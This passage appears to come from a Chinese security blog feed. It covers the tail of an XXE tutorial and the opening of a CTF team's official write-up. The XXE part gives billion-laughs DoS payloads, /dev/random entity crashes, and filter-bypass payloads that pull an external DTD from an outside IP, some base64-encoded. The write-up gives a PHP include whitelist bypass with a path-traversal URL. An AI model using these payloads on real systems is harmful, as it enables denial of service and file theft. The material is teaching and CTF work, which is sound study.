class="hljs-name">core</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">catalog</span>&gt;</span><br></code></pre></td></tr></table></figure><p>Response:</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;error&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;no results for description uid=0(root) gid=0(root) groups=0(root)...</span><br></code></pre></td></tr></table></figure><p>eg :</p><p><img src="https://s2.ax1x.com/2020/02/13/1Oc9MV.png" alt="1Oc9MV.png"></p><p><img src="https://s2.ax1x.com/2020/02/13/1OcCrT.png" alt="1OcCrT.png"></p><p>è¯¥CASEæ˜¯åœ¨å®‰è£…expectæ‰©å±•çš„PHPç¯å¢ƒé‡Œæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå…¶ä»–åè®®ä¹Ÿæœ‰å¯èƒ½å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ã€‚</p><h2 id="DOSæ”»å‡»"><a href="#DOSæ”»å‡»" class="headerlink" title="DOSæ”»å‡»"></a>DOSæ”»å‡»</h2><p><a href="https://www.freebuf.com/vuls/194112.html#DOS%E6%94%BB%E5%87%BB">XML DOSæ”»å‡»</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">lolz</span> [</span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol</span> <span class="hljs-string">&quot;lol&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol2</span> <span class="hljs-string">&quot;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol3</span> <span class="hljs-string">&quot;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol4</span> <span class="hljs-string">&quot;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol5</span> <span class="hljs-string">&quot;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol6</span> <span class="hljs-string">&quot;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol7</span> <span class="hljs-string">&quot;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol8</span> <span class="hljs-string">&quot;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&quot;</span>&gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">lol9</span> <span class="hljs-string">&quot;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&quot;</span>&gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">lolz</span>&gt;</span>&amp;lol9;<span class="hljs-tag">&lt;/<span class="hljs-name">lolz</span>&gt;</span><br></code></pre></td></tr></table></figure><p>æ­¤æµ‹è¯•å¯ä»¥åœ¨å†…å­˜ä¸­å°†å°å‹ XML æ–‡æ¡£æ‰©å±•åˆ°è¶…è¿‡ 3GB è€Œä½¿æœåŠ¡å™¨å´©æºƒã€‚</p><p>æˆ–è€…ï¼Œå¦‚æœç›®æ ‡æ˜¯UNIXç³»ç»Ÿ</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">foo</span> [ </span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-keyword">foo</span> <span class="hljs-keyword">ANY</span> &gt;</span></span><br><span class="hljs-meta">  <span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///dev/random&quot;</span> &gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">foo</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">foo</span>&gt;</span><br></code></pre></td></tr></table></figure><p>å¦‚æœ XML è§£æå™¨å°è¯•ä½¿ç”¨ &#x2F;dev&#x2F;random æ–‡ä»¶ä¸­çš„å†…å®¹æ¥æ›¿ä»£å®ä½“ï¼Œåˆ™æ­¤ç¤ºä¾‹ä¼šä½¿æœåŠ¡å™¨ï¼ˆä½¿ç”¨ UNIX ç³»ç»Ÿï¼‰å´©æºƒã€‚</p><h1 id="ç»•è¿‡å§¿åŠ¿"><a href="#ç»•è¿‡å§¿åŠ¿" class="headerlink" title="ç»•è¿‡å§¿åŠ¿"></a>ç»•è¿‡å§¿åŠ¿</h1><p>å‚è€ƒ <a href="http://www.cl4y.top/xxe%E7%AC%94%E8%AE%B0/#toc-head-6">cl4yçš„blog</a> </p><h2 id="å¤§å°å†™ç»•è¿‡"><a href="#å¤§å°å†™ç»•è¿‡" class="headerlink" title="å¤§å°å†™ç»•è¿‡"></a>å¤§å°å†™ç»•è¿‡</h2><p>åˆ©ç”¨æ­£åˆ™åŒ¹é…çš„ä¸ä¸¥æ ¼ï¼Œå¤§å°å†™ç»•è¿‡ã€‚</p><h2 id="htmlå®ä½“ç¼–ç ç»•è¿‡"><a href="#htmlå®ä½“ç¼–ç ç»•è¿‡" class="headerlink" title="htmlå®ä½“ç¼–ç ç»•è¿‡"></a>htmlå®ä½“ç¼–ç ç»•è¿‡</h2><p>å¦‚æœè¿‡æ»¤äº†httpç­‰åè®®ï¼Œå¯ä»¥åˆ©ç”¨å®ä½“ç¼–ç ç»•è¿‡ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-string">&quot; &lt;!ENTITY %  b SYSTEM &#x27;http://118.25.14.40:8200/hack.dtd&#x27;&gt; &quot;</span>&gt;</span> </span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;hhh;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="data-x2F-x2F-åè®®ç»•è¿‡"><a href="#data-x2F-x2F-åè®®ç»•è¿‡" class="headerlink" title="data:&#x2F;&#x2F;åè®®ç»•è¿‡"></a>data:&#x2F;&#x2F;åè®®ç»•è¿‡</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;data://text/plain;base64,PCFFTlRJVFkgJSAgYiBTWVNURU0gJ2h0dHA6Ly8xMTguMjUuMTQuNDA6ODIwMC9oYWNrLmR0ZCc+&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">    %b;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><span class="hljs-symbol">&amp;hhh;</span><span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-comment">&lt;!--ç¼–ç å†…å®¹--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="file-x2F-x2F-åè®®åŠ æ–‡ä»¶ä¸Šä¼ "><a href="#file-x2F-x2F-åè®®åŠ æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="file:&#x2F;&#x2F;åè®®åŠ æ–‡ä»¶ä¸Šä¼ "></a>file:&#x2F;&#x2F;åè®®åŠ æ–‡ä»¶ä¸Šä¼ </h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-comment">&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY % b <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;http://118.25.14.40:8200/hack.dtd&#x27;</span>&gt;</span><br><br></code></pre></td></tr></table></figure><h2 id="php-x2F-x2F-filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ "><a href="#php-x2F-x2F-filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ " class="headerlink" title="php:&#x2F;&#x2F;filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ "></a>php:&#x2F;&#x2F;filteråè®®åŠ æ–‡ä»¶ä¸Šä¼ </h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hhh;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br> <br><span class="hljs-comment">&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;</span><br><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">hhh</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&#x27;php://filter/read=convert.base64-encode/resource=./flag.php&#x27;</span>&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> ?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta">    <span class="hljs-meta">&lt;!ENTITY % a <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-decode/resource=/var/www/uploads/cfcd208495d565ef66e7dff9f98764da.jpg&quot;</span>&gt;</span></span><br><span class="hljs-meta">    %a;</span><br><span class="hljs-meta">]&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">test</span>&gt;</span><br>        <span class="hljs-symbol">&amp;hhh;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">test</span>&gt;</span><br><span class="hljs-comment">&lt;!--ä¸Šä¼ æ–‡ä»¶--&gt;</span><br>PCFFTlRJVFkgaGhoIFNZU1RFTSAncGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4vZmxhZy5waHAnPg==<br></code></pre></td></tr></table></figure><p>æ›´åŠ æ·±å…¥çš„å¯å‚è€ƒ <a href="https://mp.weixin.qq.com/s?__biz=MzU1ODg3NTMyMQ==&mid=2247489349&idx=1&sn=ab435be65bc6c35a21ea4bd040693d8c&source=41#wechat_redirect">XXE æ‹“å±•</a></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Wusté—²å¾—è›‹ç–¼æ˜¥èŠ‚çæ¬¢ä¹èµ›_å®˜æ–¹WriteUp</title>
    <link href="/2020/02/08/wust_funnyctf_WriteUp/"/>
    <url>/2020/02/08/wust_funnyctf_WriteUp/</url>
    
    <content type="html"><![CDATA[<h1 id="Wusté—²å¾—è›‹ç–¼æ˜¥èŠ‚çæ¬¢ä¹èµ›-å®˜æ–¹WriteUp"><a href="#Wusté—²å¾—è›‹ç–¼æ˜¥èŠ‚çæ¬¢ä¹èµ›-å®˜æ–¹WriteUp" class="headerlink" title="Wusté—²å¾—è›‹ç–¼æ˜¥èŠ‚çæ¬¢ä¹èµ› å®˜æ–¹WriteUp"></a>Wusté—²å¾—è›‹ç–¼æ˜¥èŠ‚çæ¬¢ä¹èµ› å®˜æ–¹WriteUp</h1><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>å› ä¸ºç–«æƒ…çš„åŸå› ï¼Œå¤§å®¶åœ¨å®¶é—²ç€(å¤§å®¶å†…å¿ƒï¼šå¹¶ä¸)ä¹Ÿæ˜¯é—²ç€ï¼Œä¸å¦‚å°±æ­å»ºä¸€ä¸ªå¹³å°ï¼Œæ‰¾ä¸€äº›ç­¾åˆ°é¢˜æ¥è®­ç»ƒä¸€ä¸‹æ–°äººï¼Œè‡³å°‘è®©æ–°äººçŸ¥é“æ¯”èµ›çš„æµç¨‹è¿˜æœ‰ä¸€äº›æ³¨æ„äº‹é¡¹ï¼Œä¸€äº›åŸºæœ¬çš„æ“ä½œç­‰ï¼Œé¢˜ç›®æ¥æºäºå„ç§å¼€æºä»£ç ï¼ŒåŒ…æ‹¬å—é‚®çš„æ ¡èµ›å’Œsuctfçš„é¢˜ç›®ã€‚</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="Webç­¾åˆ°é¢˜"><a href="#Webç­¾åˆ°é¢˜" class="headerlink" title="Webç­¾åˆ°é¢˜"></a>Webç­¾åˆ°é¢˜</h3><p>é¡¾åæ€ä¹‰ï¼Œå°±æ˜¯Webçš„ç­¾åˆ°é¢˜ï¼Œä½†æˆ‘æ²¡æœ‰æƒ³åˆ°æ¯”éš”å£ç¨å¾®å¤æ‚ä¸€ç‚¹çš„ç­¾åˆ°é¢˜æ›´å°‘äººè§£å‡ºæ¥ï¼Œæœ‰ç‚¹å‡ºä¹æ„æ–™ã€‚ä»¥åè¿™ç§å°±ä¸èƒ½ä¸¢ã€‚</p><p>é¢˜ç›®æè¿°æ˜¯ï¼šå»ç™¾åº¦ç­¾ä¸ªåˆ°å§ã€‚è¿™é¢˜æ¥æºäº<code>NCTF2018</code>çš„ç­¾åˆ°é¢˜ï¼Œæ‰“å¼€é¢˜ç›®é“¾æ¥ï¼Œå°±æ˜¯ç™¾åº¦ï¼Œä½†æ˜¯æˆ‘ä»¬æ³¨æ„åˆ°åœ°å€æ ä¸Šé¢çš„æ˜¯ <code>/secret.php</code>ï¼ŒæŒ‰ç†è¯´åº”è¯¥æ˜¯ <code>index.php</code> æˆ–è€…åé¢ä¸ºç©ºï¼Œè¿™å°±å¿ƒç”Ÿæ€€ç–‘ï¼Œäºæ˜¯æ‰“å¼€ <code>Burpsuite</code> ç­‰æŠ“åŒ…å·¥å…·ä¸€æ­¥ä¸€æ­¥æ¥ï¼Œè¿™é‡Œä¸ºäº†ç®€ä¾¿æˆ‘ç›´æ¥ç”¨æµè§ˆå™¨çš„<code>f12</code>ï¼Œè¿™ä¸ªæ–¹æ³•æ›´ç®€å•æ›´å¿«ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/08/1RD1r4.png" alt="1RD1r4.png"></p><p>æˆ‘ä»¬é¼ æ ‡æ”¾åœ¨é¢˜ç›®é“¾æ¥çš„æ—¶å€™ç»†å¿ƒå¯ä»¥æ³¨æ„åˆ°é“¾æ¥æ˜¯ <code>www.cohacker.cn:5011</code>ï¼Œä½†æ˜¯æˆ‘ä»¬æ‰“å¼€çš„ç•Œé¢æ˜¯ <code>/secret.php</code>ï¼Œè¿™å°±æœ‰ç‚¹ä¸å¯¹åŠ²ã€‚æ‰“å¼€<code>f12</code>ï¼Œè®¿é—® <code>www.cohacker.cn:5011</code> ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ª <code>302</code> è·³è½¬ï¼ŒæŸ¥çœ‹å¤´å°±å¯ä»¥æ‰¾åˆ° <code>flag</code> äº†ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDGZ9.png" alt="1RDGZ9.png"></p><p>å› ä¸ºæœ‰ä¸ªè·³è½¬ï¼Œæ‰€ä»¥å¤§å®¶å¯èƒ½æŠ“çš„æ—¶å€™æ²¡ç•™æ„ï¼Œå¹¶ä¸”è¦çœ‹ <code>Response</code> å¤´éƒ¨ï¼Œå¯èƒ½éƒ½çœ‹ <code>secret.php</code> çš„å¤´éƒ¨å»äº†ã€‚</p><h3 id="Crossover"><a href="#Crossover" class="headerlink" title="Crossover"></a>Crossover</h3><p>è¿™é¢˜æ˜¯ <code>HCTF2018</code> çš„ç­¾åˆ°é¢˜(åˆæ˜¯ç­¾åˆ°é¢˜)ï¼Œä¸»è¦è€ƒç‚¹æ˜¯ <code>include()</code> æ–‡ä»¶åŒ…å«çš„æ¼æ´å’Œç›®å½•ç©¿è¶Šï¼Œæ‰“å¼€é¢˜ç›®åˆæ˜¯ç†Ÿæ‚‰çš„æ»‘ç¨½ï¼Œå¸¸è§„æ“ä½œæŸ¥çœ‹æºä»£ç ã€‚</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDK2T.png" alt="1RDK2T.png"></p><p>å‘ç°æœ‰ <code>source.php</code>ï¼Œè®¿é—®å¯å¾—æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">emmm</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-built_in">static</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">checkFile</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$page</span></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-variable">$whitelist</span> = [<span class="hljs-string">&quot;source&quot;</span>=&gt;<span class="hljs-string">&quot;source.php&quot;</span>,<span class="hljs-string">&quot;hint&quot;</span>=&gt;<span class="hljs-string">&quot;hint.php&quot;</span>];<br>            <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$page</span>) || !<span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$page</span>)) &#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>            &#125;<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br><br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">urldecode</span>(<span class="hljs-variable">$page</span>);<br>            <span class="hljs-variable">$_page</span> = <span class="hljs-title function_ invoke__">mb_substr</span>(<br>                <span class="hljs-variable">$_page</span>,<br>                <span class="hljs-number">0</span>,<br>                <span class="hljs-title function_ invoke__">mb_strpos</span>(<span class="hljs-variable">$_page</span> . <span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-string">&#x27;?&#x27;</span>)<br>            );<br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_page</span>, <span class="hljs-variable">$whitelist</span>)) &#123;<br>                <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>            &#125;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;you can&#x27;t see it&quot;</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (! <span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; <span class="hljs-title function_ invoke__">is_string</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>        &amp;&amp; emmm::<span class="hljs-title function_ invoke__">checkFile</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>])<br>    ) &#123;<br>        <span class="hljs-keyword">include</span> <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>        <span class="hljs-keyword">exit</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;<br>    &#125;  <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><code>REQUSET </code> æ—¶éœ€è¦ä¼ å‚ <code>file</code> ï¼Œå¹¶ä¸”éœ€è¦æ˜¯å­—ç¬¦ä¸²ï¼ŒåŒæ—¶è¦è¿‡ <code>checkFile</code> çš„å‡½æ•°æ£€æµ‹ï¼Œåˆ†æä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç™½åå•ï¼Œåªèƒ½ä¼  <code>source.php</code> å’Œ <code>hint.php</code>ã€‚å¯ä»¥åˆ©ç”¨<code>?</code>æˆªå–<code>hint.php</code>ï¼Œç„¶ååˆ©ç”¨<code>/</code>ä½¿<code>hint.php?</code>æˆä¸ºä¸€ä¸ªä¸å­˜åœ¨çš„ç›®å½•ï¼Œæœ€å<code>include</code>åˆ©ç”¨<code>../../</code>è·³è½¬ç›®å½•è¯»å–flagã€‚è®¿é—®<code>hint.php</code>å¾—åˆ° <code>flag not here, and flag in ffffllllaaaagggg</code>ï¼Œäºæ˜¯æ„é€ payloadï¼š<code>http://49.235.15.37:8081/index.php?file=hint.php?/../../../../../../../../../ffffllllaaaagggg</code> å¾—åˆ°flagã€‚</p><h3 id="Ezphp"><a href="#Ezphp" class="headerlink" title="Ezphp"></a>Ezphp</h3><p>ç‚¹å‡»é“¾æ¥ï¼Œç›´æ¥å°±å¯ä»¥çœ‹è§æºç ï¼Œå¯¹æºç è¿›è¡Œä¸€æ³¢åˆ†æï¼š</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDJaR.png" alt="1RDJaR.png"></p><p>é€šè¿‡åˆ†æï¼Œå¤§è‡´å¯ä»¥äº†è§£åˆ°è¿™é‡Œéœ€è¦ä¼ å…¥å‚æ•° <code>value</code>ï¼Œæ»¡è¶³ä¸<code>whoami</code>çš„å€¼ç›¸åŒè¦æ»¡è¶³10æ¬¡ï¼Œä¸”è¦ç»•è¿‡md5å‡½æ•°</p><p>æ‰€ä»¥è¿™é‡Œvalueä¼ å…¥æ•°ç»„ï¼Œç”¨æ¥ç»•è¿‡MD5å‡½æ•°(å½“ç„¶çˆ†ç ´å‡ºç¬¦åˆçš„md5ä¹Ÿè¡Œ)ã€‚ä¸”å¼€å§‹æ—¶<code>whoami</code>é‡Œé¢çš„å€¼ä¸ºâ€˜eaâ€™ï¼Œæ‰€ä»¥æ„é€ å¦‚ä¸‹ï¼š</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDYI1.png" alt="1RDYI1.png"></p><p>ï¼ˆæ­¤æ—¶å‘ç°é¡µé¢çš„å¼€å¤´åˆå›æ˜¾å‡ºä¸¤ä¸ªæ–°çš„å­—æ¯ï¼Œç„¶åå°†eaæ”¹ä¸ºè¿™ä¸¤ä¸ªå­—æ¯ï¼‰</p><p><img src="https://s2.ax1x.com/2020/02/08/1RDNPx.png" alt="1RDNPx.png"></p><p>å†æ¬¡æ„é€ <code>url</code>ä¸ºï¼š<code>?value[]=qk</code> 